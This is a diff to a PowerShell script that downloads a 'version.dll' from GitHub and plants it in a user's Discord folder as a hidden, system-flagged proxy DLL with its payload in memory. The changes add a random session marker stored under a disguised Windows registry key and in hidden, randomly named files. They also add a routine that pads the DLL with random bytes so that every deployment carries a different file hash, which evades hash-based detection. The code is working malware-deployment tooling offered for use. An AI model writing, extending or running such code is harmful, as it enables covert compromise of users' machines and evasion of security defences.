@@ -109,6 +109,57 @@ function Remove-LegacyDeployFiles {
     }
 }
 
+function New-DeploySession {
+    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+
+    $sessionBytes = New-Object byte[] 16
+    $rng.GetBytes($sessionBytes)
+    $sessionId = -join ($sessionBytes | ForEach-Object { '{0:x2}' -f $_ })
+
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\AppReadiness"
+    if (-not (Test-Path $regPath)) {
+        New-Item -Path $regPath -Force | Out-Null
+    }
+    Set-ItemProperty -Path $regPath -Name "Session" -Value $sessionId -Force
+
+    $folderChars = (48..57) + (65..90)
+    $folderName = -join (1..10 | ForEach-Object { [char]$folderChars[(Get-Random -Maximum $folderChars.Length)] })
+    $markerRoot = Join-Path (Get-PayloadRoot) $folderName
+    New-Item -ItemType Directory -Path $markerRoot -Force | Out-Null
+
+    $fileStem = -join (1..12 | ForEach-Object { [char]$folderChars[(Get-Random -Maximum $folderChars.Length)] })
+    $markerFile = Join-Path $markerRoot "$fileStem.db"
+    Set-Content -Path $markerFile -Value $sessionId -Encoding ASCII -Force
+    Set-SystemHidden $markerRoot
+    Set-SystemHidden $markerFile
+
+    return $sessionId
+}
+
+function Add-DllUniqueOverlay {
+    param([string]$DllPath)
+
+    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+    $payloadSize = Get-Random -Minimum 8192 -Maximum 49153
+    $overlay = New-Object byte[] ($payloadSize + 8)
+
+    [Text.Encoding]::ASCII.GetBytes("WRPM") | CopyTo -Destination $overlay -Index 0
+    [BitConverter]::GetBytes([UInt32]$payloadSize) | CopyTo -Destination $overlay -Index 4
+    $rng.GetBytes($overlay, 8, $payloadSize)
+
+    $stream = [IO.File]::Open($DllPath, [IO.FileMode]::Open, [IO.FileAccess]::ReadWrite, [IO.FileShare]::Read)
+    try {
+        $stream.Seek(0, [IO.SeekOrigin]::End) | Out-Null
+        $stream.Write($overlay, 0, $overlay.Length)
+    }
+    finally {
+        $stream.Close()
+    }
+
+    $hash = (Get-FileHash -LiteralPath $DllPath -Algorithm SHA256).Hash.Substring(0, 16)
+    return $hash
+}
+
 function Download-GithubFile {
     param(
         [string]$RemotePath,
@@ -158,6 +209,9 @@ if (Test-Path -LiteralPath $payloadRoot) {
 
 Remove-LegacyDeployFiles -PayloadRoot $payloadRoot
 
+$sessionId = New-DeploySession
+Write-Host "[*] Deploy session: $sessionId" -ForegroundColor Gray
+
 $files = @(
     @{ Remote = "version.dll"; Local = Join-Path $discordFolder "version.dll" }
 )
@@ -165,6 +219,9 @@ $files = @(
 foreach ($file in $files) {
     Download-GithubFile -RemotePath $file.Remote -LocalPath $file.Local
 }
+
+$dllHash = Add-DllUniqueOverlay -DllPath (Join-Path $discordFolder "version.dll")
+Write-Host "[*] Unique DLL fingerprint: $dllHash" -ForegroundColor Gray
 
 $hiddenPaths = @(
     (Join-Path $discordFolder "version.dll")
@@ -177,6 +234,7 @@ Write-Host "[OK] Deploy complete (in-memory mode - version.dll only)" -Foregroun
 Write-Host "  Proxy   : $discordFolder\version.dll  [hidden+system, payload in memory]" -ForegroundColor White
 Write-Host ""
 Write-Host "Open Discord to start the session." -ForegroundColor Yellow
+
 
 
 
